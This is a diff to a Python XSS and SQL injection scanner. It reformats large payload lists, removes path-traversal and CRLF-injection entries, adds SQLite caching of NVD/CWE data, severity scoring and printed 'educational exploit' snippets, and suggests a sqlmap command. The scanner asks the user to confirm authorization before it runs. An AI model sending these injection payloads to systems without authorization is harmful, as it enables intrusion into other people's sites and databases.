@@ -6,6 +6,8 @@ import re
 import sys
 import time
 import json
+import sqlite3
+import datetime
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote_plus, urljoin
 from html.parser import HTMLParser
 import concurrent.futures
@@ -26,6 +28,7 @@ MAX_SQLI = None
 MAX_XSS = None
 THREADS = 4
 REQUEST_DELAY = 0.0  # seconds between requests across threads (throttle)
+NO_ENRICH = False  # Disable NVD/CWE enrichment
 
 # internal throttle state
 _last_request_time = 0.0
@@ -44,8 +47,7 @@ XSS_PAYLOADS = [
     "<svg><script>alert(1)</script>",
     "<body onload=alert('xss')>",
     "</tItLE><a/+/onPoINTEReNter%0a=%0aconfirm()%0dx//v3dm0s",
-    "<A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s"
-       "<img src=1 onerror=confirm('xss')>",
+    "<A%250donMOuseOvER%250a%3D%250aa%3Dprompt%2Ca()%250dx%2F%2Fv3dm0s<img src=1 onerror=confirm('xss')>",
     "<iframe src=\"javascript:confirm(1)\"></iframe>",
     "<svg onload=alert`1`>",
     "'\"><svg/onload=alert(1)>",
@@ -54,17 +56,17 @@ XSS_PAYLOADS = [
     "<details open ontoggle=alert(1)>Open</details>",
     "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
     "<object data=\"javascript:alert(1)\"></object>",
-     "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",  # alert hex-encoded
+    "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
     "<img src=x onerror=javascript:confirm%281%29>",
     "<img src=\"x\" onerror=\"/*\n*/alert(1)\">",
-     "<video><source onerror=alert(1)></video>",
+    "<video><source onerror=alert(1)></video>",
     "<math><mi onmouseover=alert(1)>X</mi></math>",
     "' onmouseover=alert(1) x='",
     "\"><svg><g onload=alert(1)></g></svg>",
     "</textarea><script>alert('xss')</script>",
     "<a href=\"javascript:/*\n*/alert(1)\">click</a>",
     "<a href='javas&#99;ript:alert(1)'>x</a>",
-     "<svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>",
+    "<svg><foreignObject><body onload=confirm(1)></body></foreignObject></svg>",
     "<form action=javascript:alert(1)><input type=submit></form>",
     "<img src=x onerror=eval('con'+'firm(1)')>",
     "<script>setTimeout(()=>alert(1),0)</script>",
@@ -78,22 +80,8 @@ XSS_PAYLOADS = [
     "<form action=\"https://example.com/post\" method=\"POST\"><input type=\"text\" value=\"<script>alert('XSS')</script>\"></form>",
     "<input type=\"text\" value='\"><script>alert(1)</script>'>",
     "<input type=\"text\" value='\"><img src=x onerror=alert(1)>'>",
-    "<form><input name=\"xss\" value=\"<img src=x onerror=alert('XSS')>\"></form>"
-        "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
-    "<textarea><script>alert('XSS')</script></textarea>",
-    "<form><button formaction=\"javascript:alert('XSS')\">Click me</button></form>",
-    "<form><input type=\"hidden\" name=\"xss\" value=\"<script>alert('XSS')</script>\"></form>",
-    "<input type=\"text\" onfocus=\"alert('XSS')\" value=\"Focus me\">",
-    "<input type=\"button\" value=\"Click me\" onclick=\"alert('XSS')\">",
-    "<form action=\"https://example.com/post\" method=\"POST\"><input type=\"text\" value=\"<script>alert('XSS')</script>\"></form>",
-    "<input type=\"text\" value='\"><script>alert(1)</script>'>",
-    "<input type=\"text\" value='\"><img src=x onerror=alert(1)>'>",
     "<form><input name=\"xss\" value=\"<img src=x onerror=alert('XSS')>\"></form>",
-     "javascript:alert(1)//",
-   "  en%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A",
-   " %0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A",
-   "../../../../../../../../../../../etc/passwd%00",
-   "{{4+4}}",
+    "javascript:alert(1)//",
 ]
 
 SQLI_PAYLOADS = [
@@ -118,107 +106,107 @@ SQLI_PAYLOADS = [
    " ' GROUP BY columnnames having 1=1 --",
    "/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/",
    "%20and%200+/**8**//*!50000UniON*/%20/*!50000sEleCt*/%20",
-    "OR 1=1"
- "OR 1=0",
- "OR x=x",
- "OR x=y",
-" OR 1=1#",
- "OR 1=0#",
- "OR x=x#",
- "OR x=y#",
- "OR 1=1-- ",
- "OR 1=0-- ",
- "OR x=x-- ",
- "OR x=y-- " ,
- "OR 3409=3409 AND ('pytW' LIKE 'pytW",
- "OR 3409=3409 AND ('pytW' LIKE 'pytY",
- "HAVING 1=1",
- "HAVING 1=0",
- "HAVING 1=1#",
- "HAVING 1=0#",
- "HAVING 1=1-- ",
- "HAVING 1=0-- ",
- "AND 1=1",
- "AND 1=0",
- "AND 1=1-- " ,
- "AND 1=0-- ",
- "AND 1=1#",
- "AND 1=0#",
- "AND 1=1 AND '%'=' ",
- "AND 1=0 AND '%'=' ",
- "AND 1083=1083 AND (1427=1427",
- "AND 7506=9091 AND (5913=5913",
- "AND 1083=1083 AND ('1427=1427",
- "AND 7506=9091 AND ('5913=5913",
- "AND 7300=7300 AND 'pKlZ'='pKlZ",
- "AND 7300=7300 AND 'pKlZ'='pKlY",
- "AND 7300=7300 AND ('pKlZ'='pKlZ",
- "AND 7300=7300 AND ('pKlZ'='pKlY",
- "AS INJECTX WHERE 1=1 AND 1=1",
- "AS INJECTX WHERE 1=1 AND 1=0",
- "AS INJECTX WHERE 1=1 AND 1=1#",
- "AS INJECTX WHERE 1=1 AND 1=0#",
- "AS INJECTX WHERE 1=1 AND 1=1-- ",
- "WHERE 1=1 AND 1=1",
- "WHERE 1=1 AND 1=0",
- "WHERE 1=1 AND 1=1#",
-" WHERE 1=1 AND 1=0#",
- "WHERE 1=1 AND 1=1--",
- "WHERE 1=1 AND 1=0--",
- "ORDER BY 1-- ",
- "ORDER BY 2-- ",
- "ORDER BY 3-- ",
- "ORDER BY 4-- ",
- "ORDER BY 5-- ",
- "ORDER BY 6-- ",
- "ORDER BY 7-- ",
- "ORDER BY 8-- ",
- "ORDER BY 9-- ",
- "ORDER BY 10-- ",
- "ORDER BY 11-- ",
- "ORDER BY 12-- ",
- "ORDER BY 13-- ",
- "ORDER BY 14-- ",
- "ORDER BY 15-- ",
- "ORDER BY 16-- ",
- "ORDER BY 17-- ",
- "ORDER BY 18-- ",
- "ORDER BY 19-- ",
-" ORDER BY 20-- ",
- "ORDER BY 21-- ",
- "ORDER BY 22-- ",
- "ORDER BY 23-- ",
- "ORDER BY 24-- ",
- "ORDER BY 25-- ",
- "ORDER BY 26-- ",
- "ORDER BY 27-- ",
- "ORDER BY 28-- ",
- "ORDER BY 29-- ",
- "ORDER BY 30-- ",
- "ORDER BY 31337-- ",
-" ORDER BY 1# ",
- "ORDER BY 2# ",
- "ORDER BY 3# ",
- "ORDER BY 4# ",
- "ORDER BY 5# ",
-" ORDER BY 6# ",
- "ORDER BY 7# ",
- "ORDER BY 8# ",
-" RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
-" RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
-"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
-"IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
-"%' AND 8310=8310 AND '%'=' ",
-"%' AND 8310=8311 AND '%'=' ",
-" and (select substring(@@version,1,1))='X' ",
-" and (select substring(@@version,1,1))='M' ",
- "and (select substring(@@version,2,1))='i' ",
-" and (select substring(@@version,2,1))='y'",
-" and (select substring(@@version,3,1))='c'",
- "and (select substring(@@version,3,1))='S'",
- "and (select substring(@@version,3,1))='X'",
- "(SELECT (CASE WHEN (2292=2292) THEN 31 ELSE (SELECT 4007 UNION SELECT 1429) END))",
- "UNION ALL SELECT NULL,CONCAT(0x7178707a71,0x566e7a6642454a4d5a784e4641625959694c78756d467a50596c68727a584c7352634f6e6e557668,0x717a786271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
+    "OR 1=1",
+    "OR 1=0",
+    "OR x=x",
+    "OR x=y",
+    "OR 1=1#",
+    "OR 1=0#",
+    "OR x=x#",
+    "OR x=y#",
+    "OR 1=1-- ",
+    "OR 1=0-- ",
+    "OR x=x-- ",
+    "OR x=y-- ",
+    "OR 3409=3409 AND ('pytW' LIKE 'pytW",
+    "OR 3409=3409 AND ('pytW' LIKE 'pytY",
+    "HAVING 1=1",
+    "HAVING 1=0",
+    "HAVING 1=1#",
+    "HAVING 1=0#",
+    "HAVING 1=1-- ",
+    "HAVING 1=0-- ",
+    "AND 1=1",
+    "AND 1=0",
+    "AND 1=1-- ",
+    "AND 1=0-- ",
+    "AND 1=1#",
+    "AND 1=0#",
+    "AND 1=1 AND '%'=' ",
+    "AND 1=0 AND '%'=' ",
+    "AND 1083=1083 AND (1427=1427",
+    "AND 7506=9091 AND (5913=5913",
+    "AND 1083=1083 AND ('1427=1427",
+    "AND 7506=9091 AND ('5913=5913",
+    "AND 7300=7300 AND 'pKlZ'='pKlZ",
+    "AND 7300=7300 AND 'pKlZ'='pKlY",
+    "AND 7300=7300 AND ('pKlZ'='pKlZ",
+    "AND 7300=7300 AND ('pKlZ'='pKlY",
+    "AS INJECTX WHERE 1=1 AND 1=1",
+    "AS INJECTX WHERE 1=1 AND 1=0",
+    "AS INJECTX WHERE 1=1 AND 1=1#",
+    "AS INJECTX WHERE 1=1 AND 1=0#",
+    "AS INJECTX WHERE 1=1 AND 1=1-- ",
+    "WHERE 1=1 AND 1=1",
+    "WHERE 1=1 AND 1=0",
+    "WHERE 1=1 AND 1=1#",
+    "WHERE 1=1 AND 1=0#",
+    "WHERE 1=1 AND 1=1--",
+    "WHERE 1=1 AND 1=0--",
+    "ORDER BY 1-- ",
+    "ORDER BY 2-- ",
+    "ORDER BY 3-- ",
+    "ORDER BY 4-- ",
+    "ORDER BY 5-- ",
+    "ORDER BY 6-- ",
+    "ORDER BY 7-- ",
+    "ORDER BY 8-- ",
+    "ORDER BY 9-- ",
+    "ORDER BY 10-- ",
+    "ORDER BY 11-- ",
+    "ORDER BY 12-- ",
+    "ORDER BY 13-- ",
+    "ORDER BY 14-- ",
+    "ORDER BY 15-- ",
+    "ORDER BY 16-- ",
+    "ORDER BY 17-- ",
+    "ORDER BY 18-- ",
+    "ORDER BY 19-- ",
+    "ORDER BY 20-- ",
+    "ORDER BY 21-- ",
+    "ORDER BY 22-- ",
+    "ORDER BY 23-- ",
+    "ORDER BY 24-- ",
+    "ORDER BY 25-- ",
+    "ORDER BY 26-- ",
+    "ORDER BY 27-- ",
+    "ORDER BY 28-- ",
+    "ORDER BY 29-- ",
+    "ORDER BY 30-- ",
+    "ORDER BY 31337-- ",
+    "ORDER BY 1# ",
+    "ORDER BY 2# ",
+    "ORDER BY 3# ",
+    "ORDER BY 4# ",
+    "ORDER BY 5# ",
+    "ORDER BY 6# ",
+    "ORDER BY 7# ",
+    "ORDER BY 8# ",
+    "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
+    "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' ",
+    "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "%' AND 8310=8310 AND '%'=' ",
+    "%' AND 8310=8311 AND '%'=' ",
+    "and (select substring(@@version,1,1))='X' ",
+    "and (select substring(@@version,1,1))='M' ",
+    "and (select substring(@@version,2,1))='i' ",
+    "and (select substring(@@version,2,1))='y'",
+    "and (select substring(@@version,3,1))='c'",
+    "and (select substring(@@version,3,1))='S'",
+    "and (select substring(@@version,3,1))='X'",
+    "(SELECT (CASE WHEN (2292=2292) THEN 31 ELSE (SELECT 4007 UNION SELECT 1429) END))",
+    "UNION ALL SELECT NULL,CONCAT(0x7178707a71,0x566e7a6642454a4d5a784e4641625959694c78756d467a50596c68727a584c7352634f6e6e557668,0x717a786271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
 
 ]
 
@@ -466,6 +454,40 @@ def is_html_response(resp):
     ctype = resp.headers.get('Content-Type','').lower()
     return resp.status_code == 200 and ('text/html' in ctype or 'application/xhtml+xml' in ctype)
 
+# ---------- Database setup ----------
+DB_PATH = 'vuln_db.sqlite'
+STALE_HOURS = 24
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS cves (
+        id TEXT PRIMARY KEY,
+        cvss REAL,
+        severity TEXT,
+        summary TEXT,
+        cwe_refs TEXT,
+        last_updated TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS cwes (
+        id TEXT PRIMARY KEY,
+        name TEXT,
+        description TEXT,
+        last_updated TEXT
+    )''')
+    conn.commit()
+    conn.close()
+
+def is_stale(last_updated_str):
+    if not last_updated_str:
+        return True
+    try:
+        last = datetime.datetime.fromisoformat(last_updated_str)
+        now = datetime.datetime.now()
+        return (now - last).total_seconds() > STALE_HOURS * 3600
+    except Exception:
+        return True
+
 # ---------- CVE (NVD) and CWE (MITRE) helpers ----------
 # Caching to limit duplicate network calls
 _NVD_CACHE = {}
@@ -487,27 +509,36 @@ def severity_from_score(score):
     return 'None'
 
 def query_nvd_cve(cve_id, timeout=10):
-    """Query official NVD API for a given CVE identifier. Returns dict with 'valid', 'cvss', 'summary', 'cwe_refs'."""
+    """Query DB first; if missing or stale, fetch from NVD API and store/update DB. Returns dict with 'valid', 'cvss', 'summary', 'cwe_refs'."""
     if not cve_id:
         return {'valid': False}
     cve_id = cve_id.upper()
-    if cve_id in _NVD_CACHE:
-        return _NVD_CACHE[cve_id]
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT cvss, severity, summary, cwe_refs, last_updated FROM cves WHERE id = ?", (cve_id,))
+    row = c.fetchone()
+    if row:
+        cvss, sev, summary, cwe_refs_str, last_updated = row
+        if not is_stale(last_updated):
+            conn.close()
+            cwe_refs = cwe_refs_str.split(',') if cwe_refs_str else []
+            return {'valid': True, 'cvss': cvss, 'severity': sev, 'summary': summary, 'cwe_refs': cwe_refs}
+    # Fetch from API
     params = {'cveId': cve_id}
     try:
         r = requests.get(NVD_API_BASE, params=params, headers={'User-Agent': USER_AGENT}, timeout=timeout)
         if r.status_code != 200:
-            _NVD_CACHE[cve_id] = {'valid': False}
-            return _NVD_CACHE[cve_id]
+            conn.close()
+            return {'valid': False}
         j = r.json()
     except Exception:
-        _NVD_CACHE[cve_id] = {'valid': False}
-        return _NVD_CACHE[cve_id]
+        conn.close()
+        return {'valid': False}
     # parse response (v2 structure)
     items = j.get('vulnerabilities') or []
     if not items:
-        _NVD_CACHE[cve_id] = {'valid': False}
-        return _NVD_CACHE[cve_id]
+        conn.close()
+        return {'valid': False}
     # find matching cve
     first = items[0].get('cve') or {}
     # extract summary
@@ -545,9 +576,14 @@ def query_nvd_cve(cve_id, timeout=10):
                 for f in found:
                     if f not in cwe_refs:
                         cwe_refs.append(f)
-    result = {'valid': True, 'cvss': cvss_score, 'summary': desc, 'cwe_refs': cwe_refs}
-    _NVD_CACHE[cve_id] = result
-    return result
+    sev = severity_from_score(cvss_score) if cvss_score is not None else 'Unknown'
+    cwe_refs_str = ','.join(cwe_refs)
+    now = datetime.datetime.now().isoformat()
+    c.execute("INSERT OR REPLACE INTO cves (id, cvss, severity, summary, cwe_refs, last_updated) VALUES (?, ?, ?, ?, ?, ?)",
+              (cve_id, cvss_score, sev, desc, cwe_refs_str, now))
+    conn.commit()
+    conn.close()
+    return {'valid': True, 'cvss': cvss_score, 'severity': sev, 'summary': desc, 'cwe_refs': cwe_refs}
 
 
 def fetch_mitre_cwe(timeout=10):
@@ -597,7 +633,7 @@ def fetch_mitre_cwe(timeout=10):
 
 
 def validate_cwe(cwe_id):
-    """Check MITRE CWE JSON for the given CWE identifier 'CWE-123'. Returns dict {'valid', 'name', 'description'}"""
+    """Query DB first; if missing or stale, fetch from MITRE API and store/update DB. Returns dict {'valid', 'name', 'description'}"""
     if not cwe_id:
         return {'valid': False}
     # normalize
@@ -605,11 +641,29 @@ def validate_cwe(cwe_id):
     if not m:
         return {'valid': False}
     numeric = m.group(1)
+    cwe_id = f"CWE-{numeric}"
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT name, description, last_updated FROM cwes WHERE id = ?", (cwe_id,))
+    row = c.fetchone()
+    if row:
+        name, description, last_updated = row
+        if not is_stale(last_updated):
+            conn.close()
+            return {'valid': True, 'name': name, 'description': description}
+    # Fetch from API
     mapping = fetch_mitre_cwe()
-    # MITRE keys in our mapping may be numeric or 'CWE-###'
     for key, info in mapping.items():
         if key.upper() == cwe_id.upper() or key.endswith(numeric):
-            return {'valid': True, 'name': info.get('name'), 'description': info.get('description')}
+            name = info.get('name')
+            description = info.get('description')
+            now = datetime.datetime.now().isoformat()
+            c.execute("INSERT OR REPLACE INTO cwes (id, name, description, last_updated) VALUES (?, ?, ?, ?)",
+                      (cwe_id, name, description, now))
+            conn.commit()
+            conn.close()
+            return {'valid': True, 'name': name, 'description': description}
+    conn.close()
     return {'valid': False}
 
 # Utility: extract CVE and CWE tokens from text
@@ -661,6 +715,27 @@ def inspect_sqli(resp_text):
             snippet = resp_text[max(0, idx-80): idx + len(sig) + 80].replace('\n',' ')
             return sig, snippet, None
     return None
+
+def determine_severity(vuln_type, payload=None, signature=None):
+    """Determine severity level for vulnerabilities: Critical, High, Medium, Low"""
+    if vuln_type == 'xss':
+        if payload:
+            low_payload = payload.lower()
+            if 'javascript:' in low_payload or 'onload' in low_payload or 'onerror' in low_payload or 'eval(' in low_payload:
+                return 'High'
+            elif '<script' in low_payload or 'alert(' in low_payload:
+                return 'Medium'
+            else:
+                return 'Low'
+        return 'Medium'  # default
+    elif vuln_type == 'sqli':
+        if signature:
+            if 'syntax error' in signature.lower() or 'mysql' in signature.lower():
+                return 'High'
+            else:
+                return 'Medium'
+        return 'Medium'  # default
+    return 'Low'
 
 # ---------- Main scan logic with CVE/CWE validation ----------
 def scan_ordered(target_url):
@@ -772,13 +847,24 @@ def scan_ordered(target_url):
 
                     rec = {'param': param, 'payload': payload, 'test_url': test_url, 'evidence': snippet, 'cves': validated_cves, 'cwes': validated_cwes}
                     overall_xss.append(rec)
+                    xss_severity = determine_severity('xss', payload=payload)
                     print_and_log(outpath, f"[++] XSS reflection detected on {param}", C.ORANGE)
                     print_and_log(outpath, f"    Evidence: {snippet[:300]}", C.ORANGE)
+                    print_and_log(outpath, f"    Severity: {xss_severity}", C.RED)
                     print_and_log(outpath, f"[++] Vulnerable webpage: {target_url}", C.GREEN)
                     print_and_log(outpath, f"[++] Parameter: {param}", C.GREEN)
                     print_and_log(outpath, f"[++] Vector: {payload}", C.GREEN)
-                    print_and_log(outpath, f"Evidence: {snippet[:300]}", C.ORANGE)
                     if validated_cves:
+                        cwe_codes = []
+                        for v in validated_cves:
+                            if v.get('valid') and v.get('cwe_refs'):
+                                cwe_codes.extend(v.get('cwe_refs'))
+                        cwe_codes = list(set(cwe_codes))
+                        if cwe_codes:
+                            print_and_log(outpath, f"    CWE: {', '.join(cwe_codes)}", C.BLUE)
+                        cve_codes = [v['cve'] for v in validated_cves if v.get('valid')]
+                        if cve_codes:
+                            print_and_log(outpath, f"    CVEs: {', '.join(cve_codes)}", C.BLUE)
                         for v in validated_cves:
                             if v.get('valid') is False:
                                 print_and_log(outpath, f"    CVE: {v.get('cve')} (NOT FOUND in NVD)", C.RED)
@@ -797,6 +883,13 @@ def scan_ordered(target_url):
                                 print_and_log(outpath, f"    CWE: {w.get('cwe')} - {w.get('name')}")
                                 if w.get('description'):
                                     print_and_log(outpath, f"      Desc: {w.get('description')[:200]}")
+                    # Educational Exploit Sample
+                    cwe_for_exploit = validated_cwes[0]['cwe'] if validated_cwes and validated_cwes[0].get('valid') else None
+                    exploit_info = get_educational_exploit('xss', cwe_for_exploit)
+                    if exploit_info:
+                        print_and_log(outpath, f"    Educational Exploit Sample:", C.BOLD)
+                        print_and_log(outpath, f"      Code: {exploit_info['code']}", C.BLUE)
+                        print_and_log(outpath, f"      Explanation: {exploit_info['explanation']}", C.BLUE)
                 else:
                     print_and_log(outpath, f"[XSS] ({idx}) No reflection detected.", None)
     else:
@@ -872,6 +965,13 @@ def scan_ordered(target_url):
                             print_and_log(outpath, f"    CWE: {w.get('cwe')} - {w.get('name')}")
                             if w.get('description'):
                                 print_and_log(outpath, f"      Desc: {w.get('description')[:200]}")
+                # Educational Exploit Sample
+                cwe_for_exploit = validated_cwes[0]['cwe'] if validated_cwes and validated_cwes[0].get('valid') else None
+                exploit_info = get_educational_exploit('sqli', cwe_for_exploit)
+                if exploit_info:
+                    print_and_log(outpath, f"    Educational Exploit Sample:", C.BOLD)
+                    print_and_log(outpath, f"      Code: {exploit_info['code']}", C.BLUE)
+                    print_and_log(outpath, f"      Explanation: {exploit_info['explanation']}", C.BLUE)
                 # suggested manual verify (do not run automatically)
                 sqlmap_cmd = f"sqlmap -u \"{target_url}\" -p {param} --dbs --batch --level=2 --risk=1"
                 print_and_log(outpath, f"    Suggested manual verify command: {sqlmap_cmd}", C.ORANGE)
@@ -895,6 +995,26 @@ def scan_ordered(target_url):
     print(f"  Output file: {outpath}")
 
 # ---------- CLI ----------
+def get_educational_exploit(vuln_type, cwe=None):
+    """Provide sample exploit code snippets and explanations based on vulnerability type and CWE."""
+    if vuln_type.lower() == 'xss':
+        if cwe and 'CWE-79' in cwe.upper():
+            code = "<script>alert('XSS')</script>"
+            explanation = "This payload injects JavaScript code that executes an alert box in the victim's browser, demonstrating Cross-Site Scripting (XSS) vulnerability where user input is not properly sanitized."
+        else:
+            code = "<img src=x onerror=alert('XSS')>"
+            explanation = "This payload uses an image tag with an onerror event to execute JavaScript, showing how XSS can be exploited to run arbitrary code in the browser."
+    elif vuln_type.lower() == 'sqli':
+        if cwe and 'CWE-89' in cwe.upper():
+            code = "' OR '1'='1' --"
+            explanation = "This payload appends a condition that makes the SQL query always true, potentially bypassing authentication or exposing sensitive data in SQL Injection vulnerabilities."
+        else:
+            code = "1' UNION SELECT database() --"
+            explanation = "This payload attempts to union additional data from the database, illustrating how SQL Injection can be used to extract information from the backend database."
+    else:
+        return None
+    return {'code': code, 'explanation': explanation}
+
 def main():
     parser = argparse.ArgumentParser(description="Ordered per-parameter tester (XSS then SQLi). Output auto to ./result/<host>.txt")
     parser.add_argument('-u', '--url', required=True, help='Target URL to scan (query string not required; crawler will discover inputs when enabled)')
@@ -907,6 +1027,9 @@ def main():
     parser.add_argument('--max-xss', type=int, default=0, help='Limit number of XSS payloads to use (0 = no limit)')
     args = parser.parse_args()
 
+    # Initialize database
+    init_db()
+
     try:
         print(color(BANNER, C.BOLD))
     except Exception:
@@ -915,12 +1038,13 @@ def main():
     print(color("🚨 scanxss.py — Ordered XSS then SQLi (auto-result)", C.BOLD))
     print(color("[!] WARNING: This tool sends HTTP requests. Run only on targets you are authorized to test.", C.RED))
 
-    global CRAWL_ENABLED, CRAWL_PAGES, REQUEST_TIMEOUT, MAX_SQLI, MAX_XSS
+    global CRAWL_ENABLED, CRAWL_PAGES, REQUEST_TIMEOUT, MAX_SQLI, MAX_XSS, NO_ENRICH
     CRAWL_ENABLED = not bool(getattr(args, 'no_crawl', False))
     CRAWL_PAGES = int(getattr(args, 'crawl_pages', CRAWL_PAGES))
     REQUEST_TIMEOUT = int(getattr(args, 'timeout', REQUEST_TIMEOUT))
     MAX_SQLI = None if getattr(args, 'max_sqli', 0) == 0 else int(getattr(args, 'max_sqli'))
     MAX_XSS = None if getattr(args, 'max_xss', 0) == 0 else int(getattr(args, 'max_xss'))
+    NO_ENRICH = args.no_enrich
 
     if not args.yes:
         confirm = input("Do you confirm you have authorization to test this target? Type 'yes' to continue: ").strip().lower()
